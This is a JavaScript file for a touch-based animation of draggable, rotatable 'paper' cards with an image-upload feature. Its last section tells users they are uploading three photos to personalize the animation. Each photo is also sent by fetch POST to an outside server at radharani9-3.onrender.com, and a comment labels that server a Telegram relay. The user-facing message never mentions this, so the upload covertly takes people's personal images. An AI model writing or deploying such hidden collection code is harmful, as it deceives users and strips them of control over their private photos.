let highestZ = 1;

class Paper {
  holdingPaper = false;
  touchStartX = 0;
  touchStartY = 0;
  touchMoveX = 0;
  touchMoveY = 0;
  prevTouchX = 0;
  prevTouchY = 0;
  velX = 0;
  velY = 0;
  rotation = Math.random() * 30 - 15;
  currentPaperX = 0;
  currentPaperY = 0;
  rotating = false;

  init(paper) {
    paper.style.touchAction = 'none'; // Prevent scroll interference

    paper.addEventListener('touchstart', (e) => {
      if (this.holdingPaper) return;
      this.holdingPaper = true;

      paper.style.zIndex = highestZ++;
      this.touchStartX = e.touches[0].clientX;
      this.touchStartY = e.touches[0].clientY;
      this.prevTouchX = this.touchStartX;
      this.prevTouchY = this.touchStartY;
    });

    paper.addEventListener('touchmove', (e) => {
      e.preventDefault();

      this.touchMoveX = e.touches[0].clientX;
      this.touchMoveY = e.touches[0].clientY;

      this.velX = this.touchMoveX - this.prevTouchX;
      this.velY = this.touchMoveY - this.prevTouchY;

      const dirX = this.touchMoveX - this.touchStartX;
      const dirY = this.touchMoveY - this.touchStartY;
      const dirLength = Math.sqrt(dirX * dirX + dirY * dirY);

      let degrees = this.rotation;
      if (this.rotating && dirLength !== 0) {
        const angle = Math.atan2(dirY, dirX);
        degrees = (360 + Math.round(180 * angle / Math.PI)) % 360;
        this.rotation = degrees;
      }

      if (this.holdingPaper) {
        if (!this.rotating) {
          this.currentPaperX += this.velX;
          this.currentPaperY += this.velY;
        }

        this.prevTouchX = this.touchMoveX;
        this.prevTouchY = this.touchMoveY;

        paper.style.transform = `translateX(${this.currentPaperX}px) translateY(${this.currentPaperY}px) rotateZ(${degrees}deg)`;
      }
    });

    paper.addEventListener('touchend', () => {
      this.holdingPaper = false;
      this.rotating = false;
    });

    paper.addEventListener('gesturestart', (e) => {
      e.preventDefault();
      this.rotating = true;
    });

    paper.addEventListener('gestureend', () => {
      this.rotating = false;
    });
  }
}

// Initialize all existing papers
const papers = Array.from(document.querySelectorAll('.paper'));
papers.forEach(paper => {
  const p = new Paper();
  p.init(paper);
});

// Observe new papers (e.g., uploaded images)
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    mutation.addedNodes.forEach((node) => {
      if (node.classList && node.classList.contains('paper')) {
        const p = new Paper();
        p.init(node);
      }
    });
  });
});

observer.observe(document.body, { childList: true });

// 📤 Telegram Upload Integration
const imageUpload = document.getElementById('imageUpload');
const imageElements = document.querySelectorAll('.paper.image img');

imageUpload.addEventListener('change', (event) => {
  const files = Array.from(event.target.files);
  if (files.length !== 3) {
    alert("Please upload exactly 3 images to personalize the animation.");
    return;
  }

  files.forEach((file, index) => {
    // Update image preview
    const reader = new FileReader();
    reader.onload = function(e) {
      if (imageElements[index]) {
        imageElements[index].src = e.target.result;
      }
    };
    reader.readAsDataURL(file);

    // Send to Telegram
    const formData = new FormData();
    formData.append('image', file);

    fetch('https://radharani9-3.onrender.com/upload', {
      method: 'POST',
      body: formData
    })
    .then(res => res.text())
    .then(msg => console.log(`Image ${index + 1} uploaded:`, msg))
    .catch(err => console.error(`Upload failed for image ${index + 1}:`, err));
  });
});
